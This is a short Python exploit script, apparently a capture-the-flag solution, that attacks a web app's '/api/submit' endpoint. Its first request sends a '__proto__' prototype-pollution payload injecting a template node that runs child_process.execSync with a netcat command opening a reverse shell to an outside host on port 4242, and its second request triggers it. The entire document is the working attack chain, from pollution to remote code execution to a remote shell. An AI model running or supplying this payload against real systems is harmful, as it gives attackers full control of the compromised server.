import requests

TARGET_URL = 'http://localhost:1337'
#TARGET_URL = 'http://138.68.147.232:30276'

# make pollution
a = requests.post(TARGET_URL + '/api/submit', json = {
    "song.name":"Not Polluting with the boys",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`nc navy356.biz 4242 -e /bin/sh`)"
    }
})
print(a.text)
# execute
a = requests.post(TARGET_URL + '/api/submit', json = {
    "song.name":"Not Polluting with the boys"
})
print(a.text)